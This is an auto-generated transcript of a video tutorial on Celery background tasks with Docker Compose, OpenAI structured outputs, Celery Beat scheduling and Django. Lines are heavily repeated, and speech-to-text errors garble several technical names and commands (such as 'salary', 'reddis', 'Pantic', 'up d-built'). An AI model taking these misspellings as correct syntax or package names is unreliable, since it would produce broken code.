call\ninstance of celery. In our case we call\ninstance of celery. In our case we call it random number. This is just the name\nit random number. This is just the name\nit random number. This is just the name of the application. Not too important.\nof the application. Not too important.\nof the application. Not too important. And then we specify the broker and the\nAnd then we specify the broker and the\nAnd then we specify the broker and the backend. These are the paths that we\nbackend. These are the paths that we\nbackend. These are the paths that we defined in our n file. So we say os.get\ndefined in our n file. So we say os.get\ndefined in our n file. So we say os.get salary broker URL and celery backend\nsalary broker URL and celery backend\nsalary broker URL and celery backend URL. So these are the values here. And\nURL. So these are the values here. And\nURL. So these are the values here. And now the only thing that we need to do to\nnow the only thing that we need to do to\nnow the only thing that we need to do to create a celery task is we need to\ncreate a celery task is we need to\ncreate a celery task is we need to annotate a function with the app.task\nannotate a function with the app.task\nannotate a function with the app.task decorator. In our case, the function is\ndecorator. In our case, the function is\ndecorator. In our case, the function is random number. It takes in some max\nrandom number. It takes in some max\nrandom number. It takes in some max value, waits for 5 seconds doing\nvalue, waits for 5 seconds doing\nvalue, waits for 5 seconds doing nothing, and then it returns random.rand\nnothing, and then it returns random.rand\nnothing, and then it returns random.rand int and a number between zero and the\nint and a number between zero and the\nint and a number between zero and the max value. So this is just simulating\nmax value. So this is just simulating\nmax value. So this is just simulating something that takes time. In reality,\nsomething that takes time. In reality,\nsomething that takes time. In reality, you would use something like an API call\nyou would use something like an API call\nyou would use something like an API call or you would process something on disk.\nor you would process something on disk.\nor you would process something on disk. You would do some calculations.\nYou would do some calculations.\nYou would do some calculations. something that takes time and would\nsomething that takes time and would\nsomething that takes time and would block the process. You do it as a task\nblock the process. You do it as a task\nblock the process. You do it as a task here so it can run in the background. In\nhere so it can run in the background. In\nhere so it can run in the background. In our case, it's just going to simulate\nour case, it's just going to simulate\nour case, it's just going to simulate something by waiting 5 seconds. This is\nsomething by waiting 5 seconds. This is\nsomething by waiting 5 seconds. This is basically the worker. That's all you\nbasically the worker. That's all you\nbasically the worker. That's all you have to do to create a simple celery\nhave to do to create a simple celery\nhave to do to create a simple celery task. Now, let us create the client. I'm\ntask. Now, let us create the client. I'm\ntask. Now, let us create the client. I'm going to call this client. py since this\ngoing to call this client. py since this\ngoing to call this client. py since this is the command that we use in our docker\nis the command that we use in our docker\nis the command that we use in our docker compos file. And here now we're going to\ncompos file. And here now we're going to\ncompos file. And here now we're going to submit a task and get the answer for\nsubmit a task and get the answer for\nsubmit a task and get the answer for this. The imports are the following.\nthis. The imports are the following.\nthis. The imports are the following. We're going to import time here as well\nWe're going to import time here as well\nWe're going to import time here as well in the client. You're going to see why\nin the client. You're going to see why\nin the client. You're going to see why in a second. Then we import from\nin a second. Then we import from\nin a second. Then we import from celery.result\ncelery.result\ncelery.result async result. This is a class. This\nasync result. This is a class. This\nasync result. This is a class. This allows us to create a result object that\nallows us to create a result object that\nallows us to create a result object that we can query. We can see if it's ready.\nwe can query. We can see if it's ready.\nwe can query. We can see if it's ready. We can retrieve the result if it is\nWe can retrieve the result if it is\nWe can retrieve the result if it is ready. So that is the class that we're\nready. So that is the class that we're\nready. So that is the class that we're going to use here in the client. And\ngoing to use here in the client. And\ngoing to use here in the client. And then from worker from our script that we\nthen from worker from our script that we\nthen from worker from our script that we just defined, we import the task so that\njust defined, we import the task so that\njust defined, we import the task so that we can actually submit it and also the\nwe can actually submit it and also the\nwe can actually submit it and also the application. Then what we do here is we\napplication. Then what we do here is we\napplication. Then what we do here is we wait 5 seconds in the beginning not for\nwait 5 seconds in the beginning not for\nwait 5 seconds in the beginning not for any functional reason just so we don't\nany functional reason just so we don't\nany functional reason just so we don't have all the cluttered output that is\nhave all the cluttered output that is\nhave all the cluttered output that is associated with booting all of this up\nassociated with booting all of this up\nassociated with booting all of this up with starting all the containers. So\nwith starting all the containers. So\nwith starting all the containers. So we're just going to wait 5 seconds and\nwe're just going to wait 5 seconds and\nwe're just going to wait 5 seconds and then we're going to submit a task by\nthen we're going to submit a task by\nthen we're going to submit a task by using the delay method. So what we do is\nusing the delay method. So what we do is\nusing the delay method. So what we do is we say result future this is not the\nwe say result future this is not the\nwe say result future this is not the result yet this is a promise this is a\nresult yet this is a promise this is a\nresult yet this is a promise this is a future result and what we do is we call\nfuture result and what we do is we call\nfuture result and what we do is we call method so random number delay we can do\nmethod so random number delay we can do\nmethod so random number delay we can do that because it's annotated with the\nthat because it's annotated with the\nthat because it's annotated with the apptask decorator from celery and we\napptask decorator from celery and we\napptask decorator from celery and we pass 100 which is the max value so let's\npass 100 which is the max value so let's\npass 100 which is the max value so let's go back to the worker max value is\ngo back to the worker max value is\ngo back to the worker max value is passed as a parameter this is a method\npassed as a parameter this is a method\npassed as a parameter this is a method but I can do method delay to submit this\nbut I can do method delay to submit this\nbut I can do method delay to submit this task using celery the result itself is\ntask using celery the result itself is\ntask using celery the result itself is going to be an asynchronous result. We\ngoing to be an asynchronous result. We\ngoing to be an asynchronous result. We pass here the ID of the future and the\npass here the ID of the future and the\npass here the ID of the future and the application that it's associated with\napplication that it's associated with\napplication that it's associated with and then we just print that the task was\nand then we just print that the task was\nand then we just print that the task was submitted. Now immediately after that we\nsubmitted. Now immediately after that we\nsubmitted. Now immediately after that we can also print the state of the\ncan also print the state of the\ncan also print the state of the asynchronous result. It's going to\nasynchronous result. It's going to\nasynchronous result. It's going to return pending because it's not yet\nreturn pending because it's not yet\nreturn pending because it's not yet processed. But what we can then do is we\nprocessed. But what we can then do is we\nprocessed. But what we can then do is we can say if this result is ready which is\ncan say if this result is ready which is\ncan say if this result is ready which is the same as saying if result.state is\nthe same as saying if result.state is\nthe same as saying if result.state is equal to success we can actually get the\nequal to success we can actually get the\nequal to success we can actually get the result and break out of the endless loop\nresult and break out of the endless loop\nresult and break out of the endless loop here. Otherwise, we can just print that\nhere. Otherwise, we can just print that\nhere. Otherwise, we can just print that the state is still pending or whatever\nthe state is still pending or whatever\nthe state is still pending or whatever it is. Wait a second and try again. Now,\nit is. Wait a second and try again. Now,\nit is. Wait a second and try again. Now, important. If you call result.get before\nimportant. If you call result.get before\nimportant. If you call result.get before it's ready, it's going to block. So, if\nit's ready, it's going to block. So, if\nit's ready, it's going to block. So, if I take this and I put it here, we're not\nI take this and I put it here, we're not\nI take this and I put it here, we're not going to see any of that because what's\ngoing to see any of that because what's\ngoing to see any of that because what's going to happen is it's going to say,\ngoing to happen is it's going to say,\ngoing to happen is it's going to say, okay, pending get. It's not done yet.\nokay, pending get. It's not done yet.\nokay, pending get. It's not done yet. So, it's going to wait here until the\nSo, it's going to wait here until the\nSo, it's going to wait here until the task is finished, until the task was\ntask is finished, until the task was\ntask is finished, until the task was executed successfully. Only then are we\nexecuted successfully. Only then are we\nexecuted successfully. Only then are we going to get the result and then we're\ngoing to get the result and then we're\ngoing to get the result and then we're going to continue with the rest of the\ngoing to continue with the rest of the\ngoing to continue with the rest of the code. If you only want to get the result\ncode. If you only want to get the result\ncode. If you only want to get the result once it's ready, you can do it like\nonce it's ready, you can do it like\nonce it's ready, you can do it like this. You can check okay not ready\nthis. You can check okay not ready\nthis. You can check okay not ready continue with the rest of the code. That\ncontinue with the rest of the code. That\ncontinue with the rest of the code. That is how you could do that. Now the final\nis how you could do that. Now the final\nis how you could do that. Now the final thing that we're missing before we can\nthing that we're missing before we can\nthing that we're missing before we can launch this is the docker file. So the\nlaunch this is the docker file. So the\nlaunch this is the docker file. So the docker file for python. This is as basic\ndocker file for python. This is as basic\ndocker file for python. This is as basic as it gets. We just take the python\nas it gets. We just take the python\nas it gets. We just take the python image. We set app as the work directory.\nimage. We set app as the work directory.\nimage. We set app as the work directory. We copy requirements txt. We install\nWe copy requirements txt. We install\nWe copy requirements txt. We install everything. We copy the data and we set\neverything. We copy the data and we set\neverything. We copy the data and we set the environment variable Python\nthe environment variable Python\nthe environment variable Python unbuffered to one. That's pretty\nunbuffered to one. That's pretty\nunbuffered to one. That's pretty standard actually. Finally, what we need\nstandard actually. Finally, what we need\nstandard actually. Finally, what we need is the requirements .txt file. Here we\nis the requirements .txt file. Here we\nis the requirements .txt file. Here we can put all the dependencies. And in our\ncan put all the dependencies. And in our\ncan put all the dependencies. And in our case, this is just going to be celery\ncase, this is just going to be celery\ncase, this is just going to be celery and then reddis in square brackets. Now\nand then reddis in square brackets. Now\nand then reddis in square brackets. Now all we have to do is we need to say\nall we have to do is we need to say\nall we have to do is we need to say docker compose up d-built. This will\ndocker compose up d-built. This will\ndocker compose up d-built. This will build a container from the image and\nbuild a container from the image and\nbuild a container from the image and then run it. So as you can see you get a\nthen run it. So as you can see you get a\nthen run it. So as you can see you get a lot of noise since Rabbit MQ is booting\nlot of noise since Rabbit MQ is booting\nlot of noise since Rabbit MQ is booting then the celery worker is booting and\nthen the celery worker is booting and\nthen the celery worker is booting and now we get the message submitted task\nnow we get the message submitted task\nnow we get the message submitted task pending pending pending pending and at\npending pending pending pending and at\npending pending pending pending and at some point we get 32 the random number\nsome point we get 32 the random number\nsome point we get 32 the random number has been generated. You can also see\nhas been generated. You can also see\nhas been generated. You can also see here the salary worker output that says\nhere the salary worker output that says\nhere the salary worker output that says task worker random number with some ID\ntask worker random number with some ID\ntask worker random number with some ID succeeded in a little bit more than 5\nsucceeded in a little bit more than 5\nsucceeded in a little bit more than 5 seconds result 32. And this is what the\nseconds result 32. And this is what the\nseconds result 32. And this is what the client receives and prints onto the\nclient receives and prints onto the\nclient receives and prints onto the screen. So let us now take a look at a\nscreen. So let us now take a look at a\nscreen. So let us now take a look at a more realistic and useful example. It's\nmore realistic and useful example. It's\nmore realistic and useful example. It's the same principle, the same concept but\nthe same principle, the same concept but\nthe same principle, the same concept but a different use case. What we do here is\na different use case. What we do here is\na different use case. What we do here is we again import OS. We import celery. In\nwe again import OS. We import celery. In\nwe again import OS. We import celery. In addition to that, we now also import\naddition to that, we now also import\naddition to that, we now also import open AI. You need to install this which\nopen AI. You need to install this which\nopen AI. You need to install this which is why we added OpenAI and Pantic here\nis why we added OpenAI and Pantic here\nis why we added OpenAI and Pantic here to the requirements txt file as well.\nto the requirements txt file as well.\nto the requirements txt file as well. And what we do here essentially is we're\nAnd what we do here essentially is we're\nAnd what we do here essentially is we're getting information about a movie in a\ngetting information about a movie in a\ngetting information about a movie in a structured way. So again we create an\nstructured way. So again we create an\nstructured way. So again we create an application. We call it movie info\napplication. We call it movie info\napplication. We call it movie info broker and backend stay the same. We\nbroker and backend stay the same. We\nbroker and backend stay the same. We create an open AI client. This is\ncreate an open AI client. This is\ncreate an open AI client. This is important. Now in my environment file, I\nimportant. Now in my environment file, I\nimportant. Now in my environment file, I also have now an open AI API key. So in\nalso have now an open AI API key. So in\nalso have now an open AI API key. So in the end file, you want to add a line\nthe end file, you want to add a line\nthe end file, you want to add a line with open AI API_key.\nwith open AI API_key.\nwith open AI API_key. Set it equal to your open AAI API key\nSet it equal to your open AAI API key\nSet it equal to your open AAI API key and then it's going to be automatically\nand then it's going to be automatically\nand then it's going to be automatically loaded here. I'm not going to show it\nloaded here. I'm not going to show it\nloaded here. I'm not going to show it because that's a secret key, but you can\nbecause that's a secret key, but you can\nbecause that's a secret key, but you can do the same thing and get access to open\ndo the same thing and get access to open\ndo the same thing and get access to open AAI. Then I define here a class movie.\nAAI. Then I define here a class movie.\nAAI. Then I define here a class movie. This is the information that I want to\nThis is the information that I want to\nThis is the information that I want to extract from a movie or for a movie.\nextract from a movie or for a movie.\nextract from a movie or for a movie. Title, release year, director, and\nTitle, release year, director, and\nTitle, release year, director, and genre. Quite simple. And then we're\ngenre. Quite simple. And then we're\ngenre. Quite simple. And then we're defining the actual task. In this case,\ndefining the actual task. In this case,\ndefining the actual task. In this case, the function is called movie info and\nthe function is called movie info and\nthe function is called movie info and takes in a prompt. This prompt is then\ntakes in a prompt. This prompt is then\ntakes in a prompt. This prompt is then sent to a large language model which\nsent to a large language model which\nsent to a large language model which responds with a structured output based\nresponds with a structured output based\nresponds with a structured output based on the movie class response format. So\non the movie class response format. So\non the movie class response format. So here we're no longer simulating waiting\nhere we're no longer simulating waiting\nhere we're no longer simulating waiting time. We actually have some waiting time\ntime. We actually have some waiting time\ntime. We actually have some waiting time because we're sending a request to an\nbecause we're sending a request to an\nbecause we're sending a request to an API and waiting for a response. In this\nAPI and waiting for a response. In this\nAPI and waiting for a response. In this case, it's going to be quite quickly\ncase, it's going to be quite quickly\ncase, it's going to be quite quickly answered, but in reality, if you have a\nanswered, but in reality, if you have a\nanswered, but in reality, if you have a large query, if you have a more complex\nlarge query, if you have a more complex\nlarge query, if you have a more complex model, it's going to take some time. I\nmodel, it's going to take some time. I\nmodel, it's going to take some time. I actually use this uh in a project right\nactually use this uh in a project right\nactually use this uh in a project right now, so I know what I'm talking about.\nnow, so I know what I'm talking about.\nnow, so I know what I'm talking about. And this is the worker. So, I can save\nAnd this is the worker. So, I can save\nAnd this is the worker. So, I can save that. And the client now interacts with\nthat. And the client now interacts with\nthat. And the client now interacts with it in the following way. We still import\nit in the following way. We still import\nit in the following way. We still import time, async, result, movie info, and\ntime, async, result, movie info, and\ntime, async, result, movie info, and app. We wait 5 seconds here again for\napp. We wait 5 seconds here again for\napp. We wait 5 seconds here again for the output. And this is basically the\nthe output. And this is basically the\nthe output. And this is basically the worker. Now, the client interacts with\nworker. Now, the client interacts with\nworker. Now, the client interacts with this worker in the same way as before.\nthis worker in the same way as before.\nthis worker in the same way as before. We have the same imports. We wait 5\nWe have the same imports. We wait 5\nWe have the same imports. We wait 5 seconds. And here I do three prompts in\nseconds. And here I do three prompts in\nseconds. And here I do three prompts in a row. So results future 1, 2, and\na row. So results future 1, 2, and\na row. So results future 1, 2, and three. I'm just asking for the movies\nthree. I'm just asking for the movies\nthree. I'm just asking for the movies Shutter Island, Inception,\nShutter Island, Inception,\nShutter Island, Inception, Predestination. I'm using the delay\nPredestination. I'm using the delay\nPredestination. I'm using the delay method for this. I'm taking these\nmethod for this. I'm taking these\nmethod for this. I'm taking these futures, adding them to a list, and then\nfutures, adding them to a list, and then\nfutures, adding them to a list, and then turning all of these elements into an\nturning all of these elements into an\nturning all of these elements into an async result with a list comprehension.\nasync result with a list comprehension.\nasync result with a list comprehension. Quite straightforward. And then I just\nQuite straightforward. And then I just\nQuite straightforward. And then I just iterate over these async results. And if\niterate over these async results. And if\niterate over these async results. And if one of them is ready, I get the answer,\none of them is ready, I get the answer,\none of them is ready, I get the answer, I print it, and then I remove it from\nI print it, and then I remove it from\nI print it, and then I remove it from the list. Quite simple. I do that with a\nthe list. Quite simple. I do that with a\nthe list. Quite simple. I do that with a waiting time of 1 second. Same idea as\nwaiting time of 1 second. Same idea as\nwaiting time of 1 second. Same idea as before, but now we have a useful task.\nbefore, but now we have a useful task.\nbefore, but now we have a useful task. So let's close this up and let's say\nSo let's close this up and let's say\nSo let's close this up and let's say docker compose up-built again. And you\ndocker compose up-built again. And you\ndocker compose up-built again. And you can see the three tasks were received.\ncan see the three tasks were received.\ncan see the three tasks were received. And I immediately get here title\nAnd I immediately get here title\nAnd I immediately get here title inception release year 2010. Christopher\ninception release year 2010. Christopher\ninception release year 2010. Christopher Nolan is the director, genre is science\nNolan is the director, genre is science\nNolan is the director, genre is science fiction. And then we have the same sort\nfiction. And then we have the same sort\nfiction. And then we have the same sort of answer here for predestination and\nof answer here for predestination and\nof answer here for predestination and shutter island. Now celery by default\nshutter island. Now celery by default\nshutter island. Now celery by default uses concurrency. So if you have\nuses concurrency. So if you have\nuses concurrency. So if you have multiple CPU cores available, it's going\nmultiple CPU cores available, it's going\nmultiple CPU cores available, it's going to use them. Which is why these three\nto use them. Which is why these three\nto use them. Which is why these three requests can be basically answered\nrequests can be basically answered\nrequests can be basically answered simultaneously. They don't have to be\nsimultaneously. They don't have to be\nsimultaneously. They don't have to be answered one by one. Now the pyantic\nanswered one by one. Now the pyantic\nanswered one by one. Now the pyantic model that we just used for movie was\nmodel that we just used for movie was\nmodel that we just used for movie was very basic and compact. In reality,\nvery basic and compact. In reality,\nvery basic and compact. In reality, however, you could be working with data\nhowever, you could be working with data\nhowever, you could be working with data models that are quite comprehensive and\nmodels that are quite comprehensive and\nmodels that are quite comprehensive and hard to fill in a single prompt. So\nhard to fill in a single prompt. So\nhard to fill in a single prompt. So maybe there's a limit, there's an actual\nmaybe there's a limit, there's an actual\nmaybe there's a limit, there's an actual hard limit, or you could just see that\nhard limit, or you could just see that\nhard limit, or you could just see that the performance decreases when you add\nthe performance decreases when you add\nthe performance decreases when you add too many fields. I myself am actually\ntoo many fields. I myself am actually\ntoo many fields. I myself am actually working on an application currently\nworking on an application currently\nworking on an application currently where I have to fill pretty large data\nwhere I have to fill pretty large data\nwhere I have to fill pretty large data models and to get reasonable results I\nmodels and to get reasonable results I\nmodels and to get reasonable results I have to split it up into multiple tasks.\nhave to split it up into multiple tasks.\nhave to split it up into multiple tasks. We can do exactly that with celery. So\nWe can do exactly that with celery. So\nWe can do exactly that with celery. So what we have here is a movie model split\nwhat we have here is a movie model split\nwhat we have here is a movie model split into three parts. We have movie part A,\ninto three parts. We have movie part A,\ninto three parts. We have movie part A, movie part B, movie part C, title,\nmovie part B, movie part C, title,\nmovie part B, movie part C, title, release year, director, genre, and a\nrelease year, director, genre, and a\nrelease year, director, genre, and a list of actors. Now in this case it\nlist of actors. Now in this case it\nlist of actors. Now in this case it doesn't make sense to split it up. The\ndoesn't make sense to split it up. The\ndoesn't make sense to split it up. The model is still quite basic and concise\nmodel is still quite basic and concise\nmodel is still quite basic and concise or compact. But in reality these could\nor compact. But in reality these could\nor compact. But in reality these could be 100 fields, 100 fields and 50 fields\nbe 100 fields, 100 fields and 50 fields\nbe 100 fields, 100 fields and 50 fields for example. So what we do here is we\nfor example. So what we do here is we\nfor example. So what we do here is we create a class for each of these parts\ncreate a class for each of these parts\ncreate a class for each of these parts and then we have also a task for filling\nand then we have also a task for filling\nand then we have also a task for filling each of these partial classes. We have\neach of these partial classes. We have\neach of these partial classes. We have movie info A, movie info B, movie info C\nmovie info A, movie info B, movie info C\nmovie info A, movie info B, movie info C which are basically the same function\nwhich are basically the same function\nwhich are basically the same function just with a different response format.\njust with a different response format.\njust with a different response format. And at the very bottom we also have a\nAnd at the very bottom we also have a\nAnd at the very bottom we also have a task for combining the parts. We pass\ntask for combining the parts. We pass\ntask for combining the parts. We pass parts here as a parameter. We have a\nparts here as a parameter. We have a\nparts here as a parameter. We have a merged empty dictionary and then we say\nmerged empty dictionary and then we say\nmerged empty dictionary and then we say here for part in parts merge.update part\nhere for part in parts merge.update part\nhere for part in parts merge.update part and then we return the merged\nand then we return the merged\nand then we return the merged dictionary. To now get a single result\ndictionary. To now get a single result\ndictionary. To now get a single result from celery for the client we can use\nfrom celery for the client we can use\nfrom celery for the client we can use groups and courts. So what we do first\ngroups and courts. So what we do first\ngroups and courts. So what we do first here is we define the prompt. We say\nhere is we define the prompt. We say\nhere is we define the prompt. We say that the header is equal to grouping\nthat the header is equal to grouping\nthat the header is equal to grouping these three functions. So we say movie\nthese three functions. So we say movie\nthese three functions. So we say movie info a b and c do s prompt. We group\ninfo a b and c do s prompt. We group\ninfo a b and c do s prompt. We group this together and then we say result is\nthis together and then we say result is\nthis together and then we say result is equal to chord of header combine parts\nequal to chord of header combine parts\nequal to chord of header combine parts s. So that is the final function that we\ns. So that is the final function that we\ns. So that is the final function that we call in the end and then we say combined\ncall in the end and then we say combined\ncall in the end and then we say combined is equal to result.get. What this\nis equal to result.get. What this\nis equal to result.get. What this results in is one output with all the\nresults in is one output with all the\nresults in is one output with all the data in a JSON object. So let's run this\ndata in a JSON object. So let's run this\ndata in a JSON object. So let's run this again by saying docker compose up-built.\nagain by saying docker compose up-built.\nagain by saying docker compose up-built. And as you can see what happens is we\nAnd as you can see what happens is we\nAnd as you can see what happens is we receive three different tasks. Then they\nreceive three different tasks. Then they\nreceive three different tasks. Then they return successfully and then we receive\nreturn successfully and then we receive\nreturn successfully and then we receive another task which is the combination\nanother task which is the combination\nanother task which is the combination task. And then as a result, the client\ntask. And then as a result, the client\ntask. And then as a result, the client prints title, Shutter Island, release\nprints title, Shutter Island, release\nprints title, Shutter Island, release year 2010, and so on and so forth with a\nyear 2010, and so on and so forth with a\nyear 2010, and so on and so forth with a list of the actors as well. Now, for the\nlist of the actors as well. Now, for the\nlist of the actors as well. Now, for the next example, we're going to get rid of\nnext example, we're going to get rid of\nnext example, we're going to get rid of the client, and we're going to add a new\nthe client, and we're going to add a new\nthe client, and we're going to add a new service called Celery Beat. Now, we're\nservice called Celery Beat. Now, we're\nservice called Celery Beat. Now, we're going to learn how to schedule stuff on\ngoing to learn how to schedule stuff on\ngoing to learn how to schedule stuff on a regular basis. For example, every 5\na regular basis. For example, every 5\na regular basis. For example, every 5 minutes, every 2 hours, or every day at\nminutes, every 2 hours, or every day at\nminutes, every 2 hours, or every day at 3:45 p.m., for example. Now, the command\n3:45 p.m., for example. Now, the command\n3:45 p.m., for example. Now, the command is almost the same. We're just using\nis almost the same. We're just using\nis almost the same. We're just using beat instead of worker. So, we're saying\nbeat instead of worker. So, we're saying\nbeat instead of worker. So, we're saying salary- a worker. This is the\nsalary- a worker. This is the\nsalary- a worker. This is the application and then the beat command,\napplication and then the beat command,\napplication and then the beat command, not the worker command. In addition to\nnot the worker command. In addition to\nnot the worker command. In addition to that, we also add a volume. This is not\nthat, we also add a volume. This is not\nthat, we also add a volume. This is not a proper docker volume. What we're doing\na proper docker volume. What we're doing\na proper docker volume. What we're doing here is we're mapping a directory called\nhere is we're mapping a directory called\nhere is we're mapping a directory called data in our current directory to the\ndata in our current directory to the\ndata in our current directory to the /data path in the container. And for\n/data path in the container. And for\n/data path in the container. And for this to work, we also need to do the\nthis to work, we also need to do the\nthis to work, we also need to do the same thing in the worker. Now, we can\nsame thing in the worker. Now, we can\nsame thing in the worker. Now, we can save that. And in the worker, we do all\nsave that. And in the worker, we do all\nsave that. And in the worker, we do all the work. So, we don't need the client\nthe work. So, we don't need the client\nthe work. So, we don't need the client anymore. We don't need anyone to submit\nanymore. We don't need anyone to submit\nanymore. We don't need anyone to submit a task. What we do here is we import\na task. What we do here is we import\na task. What we do here is we import from celery.scu. schedules the schedule\nfrom celery.scu. schedules the schedule\nfrom celery.scu. schedules the schedule and the cron tab function. The schedule\nand the cron tab function. The schedule\nand the cron tab function. The schedule function is used for executing a task\nfunction is used for executing a task\nfunction is used for executing a task every 10 seconds for example whereas the\nevery 10 seconds for example whereas the\nevery 10 seconds for example whereas the chronab allows us to specify times and\nchronab allows us to specify times and\nchronab allows us to specify times and dates. The task that we're using here is\ndates. The task that we're using here is\ndates. The task that we're using here is quite simple and straightforward. We\nquite simple and straightforward. We\nquite simple and straightforward. We have an output path which is\nhave an output path which is\nhave an output path which is /data/timestamp.txt.\n/data/timestamp.txt.\n/data/timestamp.txt. We create this directory and file if it\nWe create this directory and file if it\nWe create this directory and file if it doesn't exist. Otherwise, we just append\ndoesn't exist. Otherwise, we just append\ndoesn't exist. Otherwise, we just append to the file. And what we do is we append\nto the file. And what we do is we append\nto the file. And what we do is we append the current timestamp in ISO format.\nthe current timestamp in ISO format.\nthe current timestamp in ISO format. Now, as I said, there's two way to\nNow, as I said, there's two way to\nNow, as I said, there's two way to schedule stuff here. We can use schedule\nschedule stuff here. We can use schedule\nschedule stuff here. We can use schedule to say every 10 seconds. Or we can say\nto say every 10 seconds. Or we can say\nto say every 10 seconds. Or we can say schedule at a specific time every day.\nschedule at a specific time every day.\nschedule at a specific time every day. For example, 16:33 would be 4:33 p.m. In\nFor example, 16:33 would be 4:33 p.m. In\nFor example, 16:33 would be 4:33 p.m. In our case now, it's 16:46. So, let's go\nour case now, it's 16:46. So, let's go\nour case now, it's 16:46. So, let's go with 16:48. And I'm going to show you\nwith 16:48. And I'm going to show you\nwith 16:48. And I'm going to show you how this triggers. For this, I'm going\nhow this triggers. For this, I'm going\nhow this triggers. For this, I'm going to comment out this one so we don't\nto comment out this one so we don't\nto comment out this one so we don't confuse the two. Also, you can see I'm\nconfuse the two. Also, you can see I'm\nconfuse the two. Also, you can see I'm setting the time zone to be equal to\nsetting the time zone to be equal to\nsetting the time zone to be equal to Vienna. And I'm enabling UTC just to\nVienna. And I'm enabling UTC just to\nVienna. And I'm enabling UTC just to make sure that this is the same time\nmake sure that this is the same time\nmake sure that this is the same time that I have here on my system. So I can\nthat I have here on my system. So I can\nthat I have here on my system. So I can save this and now I can say docker\nsave this and now I can say docker\nsave this and now I can say docker compose up-build. Again, in the\ncompose up-build. Again, in the\ncompose up-build. Again, in the meantime, I'm going to open up a second\nmeantime, I'm going to open up a second\nmeantime, I'm going to open up a second terminal. Navigate to the same\nterminal. Navigate to the same\nterminal. Navigate to the same directory. And what we can see here is\ndirectory. And what we can see here is\ndirectory. And what we can see here is that I don't have it yet. But I now have\nthat I don't have it yet. But I now have\nthat I don't have it yet. But I now have the data directory. In here, I have\nthe data directory. In here, I have\nthe data directory. In here, I have nothing. But we can now watch this. I\nnothing. But we can now watch this. I\nnothing. But we can now watch this. I can say watch- N1 ls. And when a new\ncan say watch- N1 ls. And when a new\ncan say watch- N1 ls. And when a new file is created, we're going to see that\nfile is created, we're going to see that\nfile is created, we're going to see that it's listed here. There you go. You can\nit's listed here. There you go. You can\nit's listed here. There you go. You can see that task was successfully executed\nsee that task was successfully executed\nsee that task was successfully executed and now we have a timestamp.txt.\nand now we have a timestamp.txt.\nand now we have a timestamp.txt. So now I can stop this command and I can\nSo now I can stop this command and I can\nSo now I can stop this command and I can say cat timestamp txt and I see the\nsay cat timestamp txt and I see the\nsay cat timestamp txt and I see the timestamp that was written to this\ntimestamp that was written to this\ntimestamp that was written to this particular file. Now let's stop this.\nparticular file. Now let's stop this.\nparticular file. Now let's stop this. Let's go back into the worker and let's\nLet's go back into the worker and let's\nLet's go back into the worker and let's comment out this part. And now comment\ncomment out this part. And now comment\ncomment out this part. And now comment out this part. And let's say every 5\nout this part. And let's say every 5\nout this part. And let's say every 5 seconds I want to have something like\nseconds I want to have something like\nseconds I want to have something like this happening. Now I can do docker\nthis happening. Now I can do docker\nthis happening. Now I can do docker compose up and build again. I can also\ncompose up and build again. I can also\ncompose up and build again. I can also say watch- N1cat timestamp.txt. And now\nsay watch- N1cat timestamp.txt. And now\nsay watch- N1cat timestamp.txt. And now we should see every 5 seconds something\nwe should see every 5 seconds something\nwe should see every 5 seconds something added to this file. There you go. There\nadded to this file. There you go. There\nadded to this file. There you go. There you go again. And there you go again.\nyou go again. And there you go again.\nyou go again. And there you go again. Now, last but not least, I want to show\nNow, last but not least, I want to show\nNow, last but not least, I want to show you how all of this could look inside of\nyou how all of this could look inside of\nyou how all of this could look inside of a Django application. Now, since this\na Django application. Now, since this\na Django application. Now, since this would take too much time, I'm not going\nwould take too much time, I'm not going\nwould take too much time, I'm not going to show you everything step by step\nto show you everything step by step\nto show you everything step by step here, but you will find the code at the\nhere, but you will find the code at the\nhere, but you will find the code at the link in the description down below on my\nlink in the description down below on my\nlink in the description down below on my GitHub repository. And what you can do\nGitHub repository. And what you can do\nGitHub repository. And what you can do is you can just look at this project,\nis you can just look at this project,\nis you can just look at this project, open it in your editor and look for all\nopen it in your editor and look for all\nopen it in your editor and look for all the occurrences of note. So you can also\nthe occurrences of note. So you can also\nthe occurrences of note. So you can also do the same thing in the command line\ndo the same thing in the command line\ndo the same thing in the command line with rip grap. So rg note and it's going\nwith rip grap. So rg note and it's going\nwith rip grap. So rg note and it's going to show you all the notes that I've\nto show you all the notes that I've\nto show you all the notes that I've added here. I added these notes\nadded here. I added these notes\nadded here. I added these notes everywhere where I changed something,\neverywhere where I changed something,\neverywhere where I changed something, where I added something, where I um\nwhere I added something, where I um\nwhere I added something, where I um added a new file, changed something\nadded a new file, changed something\nadded a new file, changed something about the code, whatever. So if you want\nabout the code, whatever. So if you want\nabout the code, whatever. So if you want to see what's different compared to the\nto see what's different compared to the\nto see what's different compared to the default Django settings or the default\ndefault Django settings or the default\ndefault Django settings or the default docker compose that we used before, you\ndocker compose that we used before, you\ndocker compose that we used before, you can just look for note and you will find\ncan just look for note and you will find\ncan just look for note and you will find all the diffs. So the most important\nall the diffs. So the most important\nall the diffs. So the most important part is we have in our docker compose\npart is we have in our docker compose\npart is we have in our docker compose now uh the web service here. This is a\nnow uh the web service here. This is a\nnow uh the web service here. This is a new service that runs the actual Django\nnew service that runs the actual Django\nnew service that runs the actual Django application. Nothing too fancy. We still\napplication. Nothing too fancy. We still\napplication. Nothing too fancy. We still have the same uh rabbit MQ and uh\nhave the same uh rabbit MQ and uh\nhave the same uh rabbit MQ and uh celery. We don't have Reddus anymore\ncelery. We don't have Reddus anymore\ncelery. We don't have Reddus anymore because we're now using the Django DB\nbecause we're now using the Django DB\nbecause we're now using the Django DB back end which is basically SQLite in\nback end which is basically SQLite in\nback end which is basically SQLite in this case. And when we take a look at\nthis case. And when we take a look at\nthis case. And when we take a look at the code, we can go here to celery\nthe code, we can go here to celery\nthe code, we can go here to celery example. This is what I call this\nexample. This is what I call this\nexample. This is what I call this application. And you will see that I\napplication. And you will see that I\napplication. And you will see that I have a file called celery.py. What we do\nhave a file called celery.py. What we do\nhave a file called celery.py. What we do here is we get the settings from Django.\nhere is we get the settings from Django.\nhere is we get the settings from Django. We create a celery application movie\nWe create a celery application movie\nWe create a celery application movie project. This is the same LLM example\nproject. This is the same LLM example\nproject. This is the same LLM example that we had before. And we basically say\nthat we had before. And we basically say\nthat we had before. And we basically say auto discover tasks. So look for tasks\nauto discover tasks. So look for tasks\nauto discover tasks. So look for tasks and discover them. Run them. In the init\nand discover them. Run them. In the init\nand discover them. Run them. In the init py what I do is I say from celery import\npy what I do is I say from celery import\npy what I do is I say from celery import celery app celery. This is important so\ncelery app celery. This is important so\ncelery app celery. This is important so that this application can actually be\nthat this application can actually be\nthat this 